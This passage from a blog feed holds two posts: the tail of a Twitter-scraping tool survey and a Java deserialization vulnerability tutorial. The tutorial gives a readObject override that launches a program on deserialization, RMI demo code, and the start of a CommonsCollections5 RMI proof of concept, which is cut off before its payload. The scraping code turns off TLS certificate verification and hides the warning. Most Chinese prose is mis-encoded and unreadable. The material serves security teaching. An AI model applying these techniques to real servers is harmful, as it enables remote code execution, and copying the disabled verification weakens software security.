href="https://github.com/markowanga/stweet">stweet</a></h2><p>æ”¯æŒæ¨ç‰¹çš„é«˜çº§æœç´¢é€‰é¡¹ï¼ŒåŒæ—¶æ”¯æŒæ¨æ–‡å’Œç”¨æˆ·ä¿¡æ¯çš„çˆ¬å–ï¼Œstweet/docs/notebooks/ ç›®å½•ä¸‹æœ‰å„ç§ç¤ºä¾‹ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install stweet</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> æä¾›è®¸å¤šé…ç½®é¡¹ï¼Œéå¸¸å‹å¥½</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> arrow</span><br><span class="line"><span class="keyword">import</span> stweet <span class="keyword">as</span> st</span><br><span class="line"></span><br><span class="line">ProxyConfig = st.RequestsWebClientProxyConfig(</span><br><span class="line">    http_proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span>,</span><br><span class="line">    https_proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">since = arrow.get(<span class="string">&#x27;2021-10-01&#x27;</span>)</span><br><span class="line">until = arrow.get(<span class="string">&#x27;2021-10-02&#x27;</span>)</span><br><span class="line"></span><br><span class="line">search_tweets_task = st.SearchTweetsTask(</span><br><span class="line">    exact_words=<span class="string">&quot;nijisanji&quot;</span>,</span><br><span class="line">    since=since,</span><br><span class="line">    until=until,</span><br><span class="line">    replies_filter=st.RepliesFilter.ONLY_ORIGINAL,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">st.TweetSearchRunner(</span><br><span class="line">    search_tweets_task=search_tweets_task,</span><br><span class="line">    tweet_outputs=[st.CsvTweetOutput(<span class="string">&#x27;nijisanji_20211001_20211002.csv&#x27;</span>), st.PrintTweetOutput()],</span><br><span class="line">    web_client=st.RequestsWebClient(proxy=ProxyConfig, verify=<span class="literal">False</span>),</span><br><span class="line">).run()</span><br></pre></td></tr></table></figure><p> ä¸ç¢äº‹å„¿çš„è­¦å‘Š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\linki\Desktop\t\lib\site-packages\urllib3\connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host <span class="string">&#x27;127.0.0.1&#x27;</span>. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html<span class="comment">#ssl-warnings</span></span><br><span class="line">warnings.warn(</span><br></pre></td></tr></table></figure><p> æ·»åŠ ä»¥ä¸‹è¯­å¥å…³é—­</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br></pre></td></tr></table></figure><p> çˆ¬å¾—éå¸¸å¿«ï¼Œå­—æ®µä¹Ÿæ¯” scweet æ”¶é›†çš„å¤šï¼Œä½†æ˜¯åªæœ‰ 2021.10.02 çš„æ•°æ®ï¼Œéš¾é“æ—¶é—´èŒƒå›´æ˜¯å·¦å¼€å³é—­çš„ã€‚å¤šè¯•å‡ æ¬¡å‘ç°çˆ¬å¤ªå¿«äº†æç¤º <code>è¿œç¨‹ä¸»æœºå¼ºè¿«å…³é—­äº†ä¸€ä¸ªç°æœ‰çš„è¿æ¥</code>ï¼Œè€Œä¸”æ¯æ¬¡çˆ¬å–çš„ç»“æœéƒ½ä¸ä¸€æ ·â€¦</p> <img src="https://i.loli.net/2021/10/11/cXw9h8bOK1EAYjQ.png"></li></ol><ol start="3"><li><p>æ€»ç»“</p><p> è™½ç„¶èƒ½ç”¨ä½†æœ‰ç‚¹é—®é¢˜ï¼Œä½œè€…æ­£åœ¨å‡†å¤‡ stweet 2.0ï¼Œç­‰æ¨å‡ºä¹‹åå†è¿›è¡Œå°è¯•ã€‚</p></li></ol><h2 id="Web-Scraping-Tweet-Traffic"><a href="#Web-Scraping-Tweet-Traffic" class="headerlink" title="Web_Scraping_Tweet_Traffic"></a><a href="https://github.com/wyfok/Web_Scraping_Tweet_Traffic">Web_Scraping_Tweet_Traffic</a></h2><p>é…åˆæ–‡ç« é£Ÿç”¨ï¼š</p><ul><li><a href="https://medium.com/@wyfok/web-scrape-twitter-by-python-selenium-part-1-b3e2db29051d">Web Scrape Twitter by Python Selenium (Part 1)</a></li><li><a href="https://medium.com/@wyfok/web-scrape-twitter-by-python-selenium-part-2-c22ae3e78e03">Web Scrape Twitter by Python Selenium (Part 2)</a></li></ul><p>è¯¥ä»“åº“å·²äº 2019 å¹´åœæ›´ï¼Œå¯ä½œä¸ºçˆ¬å–æ€è·¯çš„å­¦ä¹ ææ–™ã€‚</p><h1 id="åœ¨çº¿çˆ¬å–"><a href="#åœ¨çº¿çˆ¬å–" class="headerlink" title="åœ¨çº¿çˆ¬å–"></a>åœ¨çº¿çˆ¬å–</h1><p><a href="https://www.vicinitas.io/free-tools/download-search-tweets">https://www.vicinitas.io/free-tools/download-search-tweets</a> ï¼Œéœ€è¦æ¨ç‰¹è´¦æˆ·ç™»é™†åçˆ¬å–ï¼Œå¯ä»¥ä¸€è¯•ã€‚</p><img src="https://i.loli.net/2021/10/11/ckCoM9PsF18huad.jpg">]]></content>
    
    
    <summary type="html">æŒ‚ä¸ªä»£ç†ç›´æ¥çˆ¬å–</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Java ååºåˆ—åŒ–æ¼æ´å…¥é—¨</title>
    <link href="https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/"/>
    <id>https://jckling.github.io/2021/09/16/Security/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/</id>
    <published>2021-09-16T03:41:30.000Z</published>
    <updated>2021-10-11T13:39:04.669Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-ååºåˆ—åŒ–æ¼æ´"><a href="#Java-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Java ååºåˆ—åŒ–æ¼æ´"></a>Java ååºåˆ—åŒ–æ¼æ´</h1><p>åºåˆ—åŒ–ï¼šæŠŠ Java å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹ä¾¿äºä¿å­˜åœ¨å†…å­˜ã€æ–‡ä»¶ã€æ•°æ®åº“ä¸­ï¼ŒObjectOutputStream ç±»çš„ <code>writeObject()</code> æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ–ã€‚</p><p>ååºåˆ—åŒ–ï¼šæŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸º Java å¯¹è±¡çš„è¿‡ç¨‹ï¼ŒObjectInputStream ç±»çš„ <code>readObject()</code> æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚</p><p>æ¼æ´æˆå› ï¼šæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¾“å…¥ï¼Œè®©ååºåˆ—åŒ–äº§ç”Ÿéé¢„æœŸçš„å¯¹è±¡ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­æ‰§è¡Œæ„é€ çš„æ¶æ„ä»£ç ã€‚</p><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="é‡å†™-readObject-æ–¹æ³•"><a href="#é‡å†™-readObject-æ–¹æ³•" class="headerlink" title="é‡å†™ readObject æ–¹æ³•"></a>é‡å†™ readObject æ–¹æ³•</h3><p>ä½¿ç”¨é»˜è®¤çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰ obj å¯¹è±¡</span></span><br><span class="line">        String obj = <span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªåŒ…å«å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ä¿¡æ¯çš„ object æ•°æ®æ–‡ä»¶</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:/Study/BUPT/åä¸ºäº‘/2021-09-10/test/object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// writeObject() æ–¹æ³•å°† obj å¯¹è±¡å†™å…¥ object æ–‡ä»¶</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ– obj å¯¹è±¡</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:/Study/BUPT/åä¸ºäº‘/2021-09-10/test/object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ¢å¤å¯¹è±¡</span></span><br><span class="line">        String obj2 = (String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ object æ–‡ä»¶ä¸­çš„å†…å®¹ï¼ˆåºåˆ—åŒ–çš„ objï¼‰</p><ul><li><code>0xaced</code> ä¸º Java å¯¹è±¡åºåˆ—åŒ–æµçš„é­”æ•°ï¼Œ<code>0x0005</code> ä¸º Java å¯¹è±¡åºåˆ—åŒ–çš„ç‰ˆæœ¬å·ï¼ŒJava å¯¹è±¡åºåˆ—åŒ–æ•°æ®çš„å‰ 4 ä¸ªå­—èŠ‚ä¸º <code>AC ED 00 05</code></li></ul><p><img src="https://i.loli.net/2021/09/16/OD7GcKlSnPauLI4.png" style="zoom:80%;" /><br /></p><p>é‡å†™ readObject å‡½æ•°ï¼Œåœ¨å…¶ä¸­è°ƒç”¨è®¡ç®—å™¨</p><ul><li>åªæœ‰å®ç° Serializable æ¥å£çš„ç±»çš„å¯¹è±¡æ‰å¯ä»¥è¢«åºåˆ—åŒ–</li><li>é‡å†™äº† <code>readObject()</code> å‡½æ•°</li><li>é»˜è®¤çš„å†™æ–¹æ³• <code>writeObject()</code> å¯ä»¥å°†éé™æ€å’Œé transient çš„å­—æ®µåºåˆ—åŒ–</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰ myObj å¯¹è±¡</span></span><br><span class="line">        MyObject myObj = <span class="keyword">new</span> MyObject();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªåŒ…å«å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ä¿¡æ¯çš„ myobject æ•°æ®æ–‡ä»¶</span></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:/Study/BUPT/åä¸ºäº‘/2021-09-10/test/myobject&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// writeObject() æ–¹æ³•å°† myObj å¯¹è±¡å†™å…¥ myobject æ–‡ä»¶</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ– obj å¯¹è±¡</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:/Study/BUPT/åä¸ºäº‘/2021-09-10/test/myobject&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ¢å¤å¯¹è±¡</span></span><br><span class="line">        MyObject objectFromDisk = (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// é‡å†™ readObject() æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ‰§è¡Œé»˜è®¤çš„ readObject() æ–¹æ³•</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ‰§è¡Œæ‰“å¼€è®¡ç®—å™¨ç¨‹åºå‘½ä»¤</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡º <code>hi</code> å¹¶æ‰“å¼€è®¡ç®—å™¨</p><img src="https://i.loli.net/2021/09/16/wFJmiW5eLQcaOkv.jpg"><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMIï¼ˆRemote Method Invocationï¼‰ï¼šä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œå¸¸è§çš„ä¸¤ç§æ¥å£å®ç°ä¸º JRMPï¼ˆJava Remote Message Protocol ï¼ŒJava è¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®ï¼‰ä»¥åŠ CORBAã€‚</p><img src="https://i.loli.net/2021/09/16/5uDiW4J7vPRMHAX.png" style="zoom:70%"><p>ç®€å•ç†è§£ï¼šæœåŠ¡å™¨å°†æä¾›çš„æœåŠ¡å¯¹è±¡æ³¨å†Œåˆ°æ³¨å†Œè¡¨ä¸­ï¼Œå®¢æˆ·ç«¯æŸ¥è¯¢æ³¨å†Œè¡¨è·å¾—å¯¹è±¡å¹¶è°ƒç”¨</p><ol><li>æœåŠ¡ç«¯ Server.java åˆ›å»ºæ³¨å†Œè¡¨ï¼Œæ³¨å†ŒæœåŠ¡å¯¹è±¡ <code>hello</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> service.impl.HelloImpl;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        Hello hello = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ç”Ÿæˆå­˜æ ¹ï¼ˆStubï¼‰</span></span><br><span class="line">        UnicastRemoteObject.exportObject(hello,<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åˆ›å»ºæœ¬æœº 1099 ç«¯å£ä¸Šçš„ RMI registry</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å¯¹è±¡ç»‘å®šåˆ°æ³¨å†Œè¡¨ä¸­</span></span><br><span class="line">        registry.rebind(name, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>è¿œç¨‹æ¥å£å®šä¹‰åŠå®ç°</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello.java</span></span><br><span class="line"><span class="keyword">package</span> service;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Hello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// HelloImpl</span></span><br><span class="line"><span class="keyword">package</span> service.impl;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">echo</span><span class="params">(String message)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;quit&quot;</span>.equalsIgnoreCase(message.toString()))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Server will be shutdown!&quot;</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Message from client: &quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Server response:&quot;</span> + message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>å®¢æˆ·ç«¯ Client.java è°ƒç”¨è¿œç¨‹å¯¹è±¡</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"><span class="keyword">import</span> service.Hello;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// è·å–è¿œç¨‹ä¸»æœºä¸Šçš„æ³¨å†Œè¡¨</span></span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        String name = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è·å–è¿œç¨‹å¯¹è±¡</span></span><br><span class="line">        Hello hello = (Hello)registry.lookup(name);</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            Scanner sc = <span class="keyword">new</span> Scanner( System.in ); <span class="comment">// è¯»å–è¾“å…¥</span></span><br><span class="line">            String message = sc.next();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// è°ƒç”¨è¿œç¨‹æ–¹æ³•</span></span><br><span class="line">            hello.echo(message);</span><br><span class="line">            <span class="keyword">if</span>(message.equals(<span class="string">&quot;quit&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œ Server æä¾› Hello æœåŠ¡ï¼Œè¿è¡Œ Client æŸ¥è¯¢ hello è¿œç¨‹æœåŠ¡å¯¹è±¡ï¼Œè¯»å–æ§åˆ¶å°è¿è¡Œå¹¶è°ƒç”¨ã€‚</p><img src="https://i.loli.net/2021/09/16/eJc36u7bRKvmaSE.jpg" ><img src="https://i.loli.net/2021/09/16/cf2Qm6FZzPjOKax.jpg" ><h3 id="RMI-ååºåˆ—åŒ–æ¼æ´ï¼ˆCC5ï¼‰"><a href="#RMI-ååºåˆ—åŒ–æ¼æ´ï¼ˆCC5ï¼‰" class="headerlink" title="RMI ååºåˆ—åŒ–æ¼æ´ï¼ˆCC5ï¼‰"></a>RMI ååºåˆ—åŒ–æ¼æ´ï¼ˆCC5ï¼‰</h3><blockquote><p> åˆ©ç”¨äº† CommonsCollections5<br> jdk1.8 ä¹‹åå¯¹ AnnotationInvocationHandler ç±»åšäº†é™åˆ¶ï¼Œæ‰€ä»¥åœ¨ jdk1.8 ç‰ˆæœ¬å°±æ‹¿ BadAttributeValueExpException è¿›è¡Œæ›¿ä»£</p></blockquote><p>æ¼æ´æˆå› ï¼šRMI åœ¨ä¼ è¾“æ•°æ®çš„æ—¶å€™ï¼Œä¼šå°†æ•°æ®åºåˆ—åŒ–ï¼Œåœ¨ä¼ è¾“å®Œæˆåå†è¿›è¡Œååºåˆ—åŒ–ã€‚å®¢æˆ·ç«¯æä¾›æ„é€ å¥½çš„æ¶æ„æ•°æ®ï¼ŒæœåŠ¡å™¨ç«¯æ¥æ”¶åè¿›è¡Œååºåˆ—åŒ–è§¦å‘ä»£ç æ‰§è¡Œã€‚</p><ul><li>èƒ½å¤Ÿè¿›è¡Œ RMI é€šä¿¡</li><li>æœåŠ¡å™¨å¼•ç”¨ç¬¬ä¸‰æ–¹å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„åŒ…</li></ul><p>ç»“åˆ Apache Commons Collections ååºåˆ—åŒ–æ¼æ´ï¼Œæ„é€  POC</p><ul><li>jdk 8u121ä»¥ä¸‹ï¼ˆè¿™é‡Œé€‰æ‹© 8u111 å¤ç°ï¼‰</li><li><a href="https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/commons-collections-3.1.jar">commons-collections-3.1.jar</a></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 